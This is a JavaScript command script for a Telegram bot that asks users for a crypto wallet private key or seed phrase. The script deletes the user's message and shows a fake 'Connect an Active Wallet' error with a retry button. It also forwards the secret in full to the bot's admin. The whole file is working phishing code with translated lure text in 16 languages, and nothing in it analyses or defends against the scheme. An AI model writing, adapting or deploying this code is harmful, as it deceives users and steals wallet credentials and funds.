/*CMD
  command: /captureInput
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

// Define translation strings for 16 languages
var translations = {
  en: {
    noAction: "<b>❌ No action pending.</b> Please use /deposit to start.",
    error: "<b>❌ ERROR DETECTED: Connect an Active Wallet</b>",
    retry: "🔄 Retry",
    adminMsg: "<b>🔔 User {name} ({id})</b>\nEntered {inputType}: <code>{input}</code>"
  },
  it: {
    noAction: "<b>❌ Nessuna azione in sospeso.</b> Per favore, usa /deposit per iniziare.",
    error: "<b>❌ ERRORE RILEVATO: Collega un portafoglio attivo</b>",
    retry: "🔄 Riprova",
    adminMsg: "<b>🔔 Utente {name} ({id})</b>\nHa inserito {inputType}: <code>{input}</code>"
  },
  es: {
    noAction: "<b>❌ No hay acción pendiente.</b> Por favor, usa /deposit para comenzar.",
    error: "<b>❌ ERROR DETECTADO: Conecta una cartera activa</b>",
    retry: "🔄 Reintentar",
    adminMsg: "<b>🔔 Usuario {name} ({id})</b>\nIngresó {inputType}: <code>{input}</code>"
  },
  pt: {
    noAction: "<b>❌ Nenhuma ação pendente.</b> Por favor, use /deposit para começar.",
    error: "<b>❌ ERRO DETECTADO: Conecte uma carteira ativa</b>",
    retry: "🔄 Tentar novamente",
    adminMsg: "<b>🔔 Usuário {name} ({id})</b>\nInseriu {inputType}: <code>{input}</code>"
  },
  de: {
    noAction: "<b>❌ Keine ausstehende Aktion.</b> Bitte benutze /deposit, um zu starten.",
    error: "<b>❌ FEHLER ERKANNT: Verbinde eine aktive Brieftasche</b>",
    retry: "🔄 Erneut versuchen",
    adminMsg: "<b>🔔 Benutzer {name} ({id})</b>\nEingabe von {inputType}: <code>{input}</code>"
  },
  fr: {
    noAction: "<b>❌ Aucune action en attente.</b> Veuillez utiliser /deposit pour commencer.",
    error: "<b>❌ ERREUR DÉTECTÉE : Connectez un portefeuille actif</b>",
    retry: "🔄 Réessayer",
    adminMsg: "<b>🔔 Utilisateur {name} ({id})</b>\nA entré {inputType} : <code>{input}</code>"
  },
  ru: {
    noAction: "<b>❌ Нет ожидающих действий.</b> Пожалуйста, используйте /deposit для начала.",
    error: "<b>❌ ОБНАРУЖЕНА ОШИБКА: Подключите активный кошелек</b>",
    retry: "🔄 Повторить",
    adminMsg: "<b>🔔 Пользователь {name} ({id})</b>\nВвел {inputType}: <code>{input}</code>"
  },
  zh: {
    noAction: "<b>❌ 没有待处理的操作。</b> 请使用 /deposit 开始。",
    error: "<b>❌ 检测到错误：连接一个活跃的钱包</b>",
    retry: "🔄 重试",
    adminMsg: "<b>🔔 用户 {name} ({id})</b>\n输入了 {inputType}: <code>{input}</code>"
  },
  hi: {
    noAction: "<b>❌ कोई कार्रवाई लंबित नहीं है।</b> कृपया शुरू करने के लिए /deposit का उपयोग करें।",
    error: "<b>❌ त्रुटि पाई गई: एक सक्रिय वॉलेट कनेक्ट करें</b>",
    retry: "🔄 पुन: प्रयास करें",
    adminMsg: "<b>🔔 उपयोगकर्ता {name} ({id})</b>\nने दर्ज किया {inputType}: <code>{input}</code>"
  },
  ur: {
    noAction: "<b>❌ کوئی کارروائی زیر التواء نہیں ہے۔</b> شروع کرنے کے لیے /deposit استعمال کریں۔",
    error: "<b>❌ غلطی کا پتہ چلا: ایک فعال والٹ کنیکٹ کریں</b>",
    retry: "🔄 دوبارہ کوشش کریں",
    adminMsg: "<b>🔔 صارف {name} ({id})</b>\nنے درج کیا {inputType}: <code>{input}</code>"
  },
  bn: {
    noAction: "<b>❌ কোনো কার্যকলাপ স্থগিত নেই।</b> শুরু করার জন্য /deposit ব্যবহার করুন।",
    error: "<b>❌ ত্রুটি সনাক্ত হয়েছে: একটি সক্রিয় ওয়ালেট সংযুক্ত করুন</b>",
    retry: "🔄 পুনরায় চেষ্টা করুন",
    adminMsg: "<b>🔔 ব্যবহারকারী {name} ({id})</b>\nপ্রবেশ করেছে {inputType}: <code>{input}</code>"
  },
  ar: {
    noAction: "<b>❌ لا يوجد إجراء معلق.</b> يرجى استخدام /deposit للبدء.",
    error: "<b>❌ تم الكشف عن خطأ: قم بتوصيل محفظة نشطة</b>",
    retry: "🔄 إعادة المحاولة",
    adminMsg: "<b>🔔 المستخدم {name} ({id})</b>\nأدخل {inputType}: <code>{input}</code>"
  },
  tr: {
    noAction: "<b>❌ Bekleyen işlem yok.</b> Başlamak için lütfen /deposit kullanın.",
    error: "<b>❌ HATA ALGILANDI: Aktif bir cüzdan bağlayın</b>",
    retry: "🔄 Yeniden Dene",
    adminMsg: "<b>🔔 Kullanıcı {name} ({id})</b>\nGirdi: {inputType}: <code>{input}</code>"
  },
  ko: {
    noAction: "<b>❌ 진행 중인 작업이 없습니다.</b> 시작하려면 /deposit를 사용하세요.",
    error: "<b>❌ 오류 감지됨: 활성 지갑을 연결하세요</b>",
    retry: "🔄 재시도",
    adminMsg: "<b>🔔 사용자 {name} ({id})</b>\n입력한 {inputType}: <code>{input}</code>"
  },
  fil: {
    noAction: "<b>❌ Walang nakabinbing aksyon.</b> Pakigamit ang /deposit para magsimula.",
    error: "<b>❌ NAKITA ANG ERROR: Ikonekta ang isang Aktibong Wallet</b>",
    retry: "🔄 Subukan Muli",
    adminMsg: "<b>🔔 User {name} ({id})</b>\nNaglagay ng {inputType}: <code>{input}</code>"
  },
  ja: {
    noAction: "<b>❌ 保留中のアクションはありません。</b> 開始するには /deposit を使用してください。",
    error: "<b>❌ エラー検出：アクティブなウォレットを接続してください</b>",
    retry: "🔄 再試行",
    adminMsg: "<b>🔔 ユーザー {name} ({id})</b>\n入力した {inputType}: <code>{input}</code>"
  }
};

// Determine the user's language; default to English if not set
var userLang = Bot.getProperty("lang_" + user.telegramid) || "en";
var texts = translations[userLang];

// Check if there is an action waiting
var waitingFor = User.getProperty("waitingFor");
if (!waitingFor) {
  Api.sendMessage({
    text: texts.noAction,
    parse_mode: "html"
  });
  return;
}

// Determine the input type based on waitingFor
var inputType = waitingFor === "privateKey" ? "private key" : "seed phrase";

// Get user's input and then delete the input message for security
var userInput = message.text;
Api.deleteMessage({ message_id: message.message_id });

// Notify user of an error with a retry button
Api.sendMessage({
  text: texts.error,
  parse_mode: "html",
  reply_markup: {
    inline_keyboard: [
      [{ text: texts.retry, callback_data: "importwallet" }]
    ]
  }
});

// Send input to admin
var adminId = Bot.getProperty("admin"); // Set this to your admin Telegram ID in bot settings
var userId = user.telegramid;
var adminMessage = texts.adminMsg
  .replace("{name}", user.first_name)
  .replace("{id}", userId)
  .replace("{inputType}", inputType)
  .replace("{input}", userInput);

Api.sendMessage({
  chat_id: adminId,
  text: adminMessage,
  parse_mode: "html",
  reply_markup: {
    inline_keyboard: [
      [{ text: "📩 Respond", callback_data: "respond_" + userId }]
    ]
  }
});

// Clear waiting state
User.setProperty("waitingFor", null, "string");
